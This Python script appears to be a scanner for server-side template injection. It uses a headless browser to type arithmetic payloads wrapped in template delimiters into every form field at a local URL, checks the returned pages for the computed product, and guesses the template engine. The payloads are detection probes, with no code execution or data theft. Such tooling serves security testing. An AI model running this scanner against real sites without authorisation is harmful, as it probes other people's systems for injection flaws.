import asyncio
import re
import random
from pyppeteer import launch
from te_symbols import te_symbols
from decimal import Decimal


def generate_numbers_for_product():
    # Define the lower and upper bounds for a 10-digit to 18-digit product
    lower_bound = 10 ** 9  # 10 digits
    upper_bound = 10 ** 18  # 18 digits

    # Find two random numbers whose product is within the desired range
    while True:
        num1 = random.randint(10 ** 4, 10 ** 9)  # Random number for num1 (4 to 9 digits)
        num2 = random.randint(10 ** 4, 10 ** 9)  # Random number for num2 (4 to 9 digits)
        product = num1 * num2
        if lower_bound <= product < upper_bound:
            return num1, num2, product


def create_payload(symbols):
    # generate random numbers for the payload product
    #
    min_digits = 5
    max_digits = 8
    """
    num_1 = generate_number(min_digits, max_digits)
    num_2 = generate_number(min_digits, max_digits)
    """
    num_1, num_2, _ = generate_numbers_for_product()

    operation = f"{num_1}*{num_2}"
    # in a real scenario, we use values directly instead of variables like num_1 and num_2
    # like this: operation = "int(2*2)"
    # print(f"Numbers: {num_1}, {num_2}; result: {eval(operation)}")

    # find another placeholder or something more specific on Python

    if " " in symbols:
        # replace the space with the actual operation
        payload = symbols.replace(" ", operation)
    else:
        # payload = "#set $num=7*7#$num"
        payload = symbols + operation
    # in the future, return only the payload
    return payload, operation


async def exec_payload(form, payload):
    # find the input text areas
    input_txt_lst = await form.querySelectorAll("input[type=\"text\"]")

    # write the payload inside every input text area of the form
    for input_txt in input_txt_lst:
        await input_txt.type(payload)

    # find the button element and click
    btn = await form.querySelector("input[type='submit'], button[type='submit']")
    await btn.click()


async def scraper(page, url, payload):
    await page.goto(url)
    # search for all the existing forms in the page first
    forms_lst = await page.querySelectorAll("form")
    # print(f"{len(forms_lst)} form(s) found.")

    html_resp = ""
    for form_idx in range(len(forms_lst)):
        curr_form = forms_lst[form_idx]
        try:
            await exec_payload(curr_form, payload)

            # be careful for real web sites: check if the context changes
            await page.waitForNavigation()

            # await page.waitFor(2000)
            html_resp += await page.content()
            # go back to previous page and look for other forms
            await page.goBack()
            # refresh element references (with button click they are lost)
            forms_lst = await page.querySelectorAll("form")
        except Exception as e:
            print(e)

    return html_resp


def validate_injection(op_res, html_resp):
    success = False
    responses_lst = list()
    res_matches = None
    # match number in scientific notation
    sn_values = re.findall(r"\d*\.\d+E\+\d+", html_resp)

    # when value exceeds the 18 digits, PHP uses scientific notation
    """
    if sn_values:
        for sn_v in sn_values:
            base, exponent = sn_v.split("E")
            decimal_places = len(base.split(".")[1])

            # format Python value using the number of decimal digits from the PHP number
            sn_op_res = f"{Decimal(op_res):.{decimal_places}E}"
            #print(f"Formatted Python: {sn_op_res}; PHP: {sn_v}")
            if sn_op_res == sn_v:
                success = True
                match_idx = html_resp.index(sn_v)
                start, end = max(0, match_idx - 20), min(len(html_resp), match_idx + 20)
                responses_lst.append(html_resp[start:end])

    else:
    """
    res_matches = list(re.finditer(op_res, html_resp))
    if res_matches:
        success = True
        for match in res_matches:
            start, end = max(0, match.start() - 20), min(len(html_resp), match.end() + 20)
            responses_lst.append(html_resp[start:end])


    return success, responses_lst


def find_template_engines(success_symbols):
    target_engines = {}
    engines_by_symbols = []

    for symbols in success_symbols:
        for te in te_symbols[symbols]:
            engines_by_symbols.append(te)

    unique_engines = set(engines_by_symbols)
    for eng in unique_engines:
        if engines_by_symbols.count(eng) == len(success_symbols):
            target_engines[eng] = te_symbols[success_symbols[0]][eng]

    return target_engines


async def main():
    url = "http://127.0.0.1:8080"

    # it's better to use a dictionary, containing also the programming language AND the specific template engine
    # symbols_lst = ["$", "#", "< >", "{ }", "{{ }}", "<? ?>", "<?= ?>", "{{= }}", "{% %}", "${ }", "@! !@", "#{ }", "$int( )"]

    # launch browser without GUI
    browser = await launch({"headless": True})
    page = await browser.newPage()

    print("\n-----------------------")
    print("--- DETECTION PHASE ---")
    print("-----------------------")
    success_symbols = []
    success_payloads = []
    for symbols in te_symbols:
        payload, operation = create_payload(symbols)
        print(f"\nTrying symbols '{symbols}' with payload '{payload}'...")

        response = await scraper(page, url, payload)
        # print(response)

        result = str(eval(operation))
        # print("Operation result: ", result)

        success, resp_matches = validate_injection(result, response)
        if success:
            # e.g. avoid to add "{{ }}" if the list already contains successful symbols "{ }"
            symbols_are_contained = False
            for element in success_symbols:
                # NOTE: you need to handle the opposite scenario as well!
                # e.g. success_symbols = ["{{ }}"] and symbols = "{ }"
                # you need to replace in the list
                if element in symbols:
                    symbols_are_contained = True
                    break

            # if the list is still empty or the same symbols have been found in the non-empty list
            if not success_symbols or not symbols_are_contained:
                success_symbols.append(symbols)
                success_payloads.append(payload)

            print("Successful injection!")
            for match in resp_matches:
                print(match)
        else:
            print("Failed injection.")

    await browser.close()

    print("\n-----------------------")
    print("------- RESULTS -------")
    print("-----------------------")
    if success_payloads:
        print("\nSome successful payloads have been found:\n", success_payloads)
        print(f"Target template engine(s): ")
        te_dct = find_template_engines(success_symbols)
        [print(f"--> {te}({te_dct[te]})") for te in te_dct]

    else:
        print("No successful payload has been found.")


if __name__ == "__main__":
    asyncio.run(main())
